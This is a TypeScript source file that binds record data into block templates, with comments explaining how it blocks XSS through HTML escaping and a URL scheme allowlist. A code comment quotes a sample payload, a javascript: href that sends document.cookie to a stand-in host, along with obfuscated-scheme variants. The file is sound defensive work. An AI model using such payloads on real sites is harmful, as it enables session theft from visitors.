/**
 * Binding a record into a block template.
 *
 * A data block can carry an ITEM TEMPLATE — one block, designed once, drawn once
 * per record. For the copies to differ, the template needs to say "the first
 * name of this record", and it says it with `{{first_name}}`.
 *
 * THE SAFETY RULE, and the reason this is its own file with its own tests:
 * a template is authored by an admin and passes through the HTML sanitiser; a
 * record's values are DATA and never do. A customer named
 * `<img src=x onerror=…>` must not execute in a visitor's browser, and the page
 * sanitiser cannot stop it — the markup is scrubbed while the template is
 * STORED, and the value is substituted after. Substitution time is the only
 * point where both are in hand.
 *
 * So a value going into a property the renderer hands to `{@html}` is escaped
 * here. A value going anywhere else is not, because Svelte escapes a text node
 * itself and doing it twice shows the reader `&lt;img&gt;` where the record says
 * `<img>` — a display bug traded for a safety one. Which properties are which is
 * `HTML_KEYS`, and it is kept in step with `BlockRenderer`.
 */

// biome-ignore lint/suspicious/noExplicitAny: block content and rows are untyped JSON
type Any = any;

const PLACEHOLDER = /\{\{\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*\}\}/g;

/**
 * Block properties the renderer passes to `{@html}`.
 *
 * Only these get escaped substitution. Everywhere else the value is inserted
 * raw, because Svelte escapes a text node itself — escaping first as well shows
 * the reader `&lt;img&gt;` where the data says `<img>`, which is a bug of its
 * own and the reason this list is narrow rather than "escape everything".
 *
 * Kept in step with `BlockRenderer`: `richtext`/`text` render `content`/`html`,
 * `html`/`embed` render `code`/`html`, and a `columns` block renders each
 * element of `items`.
 */
export const HTML_KEYS = new Set(['content', 'html', 'code', 'items']);

/**
 * Block properties the renderer binds to an `href` or `src`.
 *
 * The THIRD sink, and the one the rule above missed. `bind.ts` reasoned about
 * two: a value going into `{@html}` is escaped, and a value going anywhere else
 * is not, because Svelte escapes a text node itself. A URL attribute is neither.
 * Svelte will not neutralise `javascript:` in `href={…}` — nothing does.
 *
 * Which made this reachable, measured on the shipped code:
 *
 *   template  { href: '{{website}}' }
 *   record    { website: "javascript:fetch('//evil.test/'+document.cookie)" }
 *   bound     href -> "javascript:fetch('//evil.test/'+document.cookie)"
 *
 * The template is admin-authored and that is fine — an admin who can write an
 * `html` block can already run script, which is the `unfiltered_html` model this
 * extension follows deliberately. The RECORD is not. It is a CRM contact, a form
 * submission, an imported row: writable by anyone who can add to a published
 * collection. A visitor clicking the card runs script in the site's origin.
 *
 * Kept in step with `BlockRenderer` by `block-contract.test.ts`, like `HTML_KEYS`
 * — the list is only as good as the thing that notices when the renderer grows a
 * sink it does not name.
 */
export const URL_KEYS = new Set([
  'href', 'url', 'src', 'link', 'cta_url', 'button_url', 'image_url',
]);

/**
 * A URL safe to put in an `href` or `src`, or `''`.
 *
 * An allowlist of schemes rather than a `javascript:` denylist: `\tjavascript:`,
 * `JaVaScRiPt:` and `java\nscript:` are all the same URL to a browser and all
 * miss a naive match. Anything not recognised becomes empty, which renders a
 * dead link rather than a live one.
 *
 * Relative URLs — `/about`, `about`, `#top`, `?q=1` — are the common case and
 * carry no scheme, so they pass. A protocol-relative `//evil.test` does not: it
 * is a different origin wearing a relative URL's clothes.
 */
export function safeUrl(value: string): string {
  const v = value.trim();
  if (v === '') return '';
  if (v.startsWith('//')) return '';
  // A scheme is letters/digits/+/-/. before the first colon, and a colon can
  // only appear later in a relative URL if a slash or ? or # came first.
  const colon = v.indexOf(':');
  if (colon === -1) return v;
  const beforeColon = v.slice(0, colon);
  if (/[/?#]/.test(beforeColon)) return v; // the colon is in a path or query
  const scheme = beforeColon.replace(/[\s\u0000-\u001f]/g, '').toLowerCase();
  return ['http', 'https', 'mailto', 'tel'].includes(scheme) ? v : '';
}

/** HTML-escape. Applied to values landing in a `HTML_KEYS` property. */
export function escapeHtml(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * A record value as display text.
 *
 * Deliberately the same reading `CollectionList` gives a table cell, so a record
 * looks the same whichever layout draws it: dates in the visitor's locale,
 * booleans as a tick, objects as compact JSON rather than `[object Object]`.
 */
export function valueToText(value: unknown): string {
  if (value === null || value === undefined) return '';
  if (typeof value === 'boolean') return value ? '✓' : '—';
  if (value instanceof Date) return value.toLocaleDateString();
  if (typeof value === 'string') {
    if (/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}/.test(value)) {
      const d = new Date(value);
      if (!Number.isNaN(d.getTime())) return d.toLocaleString();
    }
    return value;
  }
  if (typeof value === 'object') return JSON.stringify(value);
  return String(value);
}

/**
 * Replace every `{{field}}` in a string with the record's value.
 *
 * A placeholder naming a field the record does not have resolves to empty rather
 * than being left on the page: `{{phone}}` showing up literally on a published
 * site is worse than a blank, and it is what a reader would report as a bug.
 */
export function bindText(
  template: string,
  row: Record<string, Any>,
  /** True when the result will be handed to `{@html}` — see `HTML_KEYS`. */
  intoHtml = false,
): string {
  return template.replace(PLACEHOLDER, (_match, field: string) => {
    const text = valueToText(row?.[field]);
    return intoHtml ? escapeHtml(text) : text;
  });
}

/**
 * Bind a whole block, and everything nested inside it, to one record.
 *
 * Returns a new block. Ids are rewritten so each copy is distinct — the renderer
 * keys on id, and N copies sharing one id is the classic way a keyed list starts
 * reusing the wrong DOM node.
 */
export function bindBlock(block: Any, row: Record<string, Any>, rowKey: string | number): Any {
  if (!block || typeof block !== 'object') return block;

  const content: Any = {};
  for (const [key, value] of Object.entries(block.content ?? {})) {
    // Applied to BOUND blocks and not to static ones: only a bound block carries
    // record data, and an admin writing `javascript:` into a button they authored
    // is exercising a capability they already have.
    content[key] = guardUrl(key, bindValue(value, row, rowKey, HTML_KEYS.has(key)));
  }

  return {
    ...block,
    id: `${block.id ?? 'item'}:${rowKey}`,
    content,
  };
}

/** `safeUrl` for a value assigned to a URL property, at any nesting level. */
function guardUrl(key: string, bound: Any): Any {
  return URL_KEYS.has(key) && typeof bound === 'string' ? safeUrl(bound) : bound;
}

function bindValue(
  value: Any,
  row: Record<string, Any>,
  rowKey: string | number,
  intoHtml: boolean,
): Any {
  if (typeof value === 'string') return bindText(value, row, intoHtml);
  if (Array.isArray(value)) {
    return value.map((v) =>
      // An array of blocks (a container's children) binds as blocks; an array of
      // anything else binds element-wise, keeping the parent key's HTML-ness —
      // a `columns` block's `items` are HTML strings.
      v && typeof v === 'object' && typeof v.type === 'string'
        ? bindBlock(v, row, rowKey)
        : bindValue(v, row, rowKey, intoHtml),
    );
  }
  if (value && typeof value === 'object') {
    if (typeof value.type === 'string') return bindBlock(value, row, rowKey);
    const out: Any = {};
    for (const [k, v] of Object.entries(value)) {
      // The URL check belongs at EVERY level, not just the block's own keys.
      // `HTML_KEYS` was already consulted per nested key here and the URL list
      // was not, so a gallery's `images: [{ url: '{{website}}' }]` — the renderer
      // draws `src={img.url}` — took a record value straight into an attribute.
      // Found by the test that keeps these lists in step with the renderer, not
      // by reading.
      out[k] = guardUrl(k, bindValue(v, row, rowKey, intoHtml || HTML_KEYS.has(k)));
    }
    return out;
  }
  return value;
}

/** Field names a template refers to — used by the editor to warn about typos. */
export function placeholdersIn(block: Any): string[] {
  const found = new Set<string>();
  walk(block);
  return [...found];

  function walk(node: Any): void {
    if (typeof node === 'string') {
      for (const m of node.matchAll(PLACEHOLDER)) found.add(m[1]);
      return;
    }
    if (Array.isArray(node)) {
      for (const v of node) walk(v);
      return;
    }
    if (node && typeof node === 'object') {
      for (const v of Object.values(node)) walk(v);
    }
  }
}
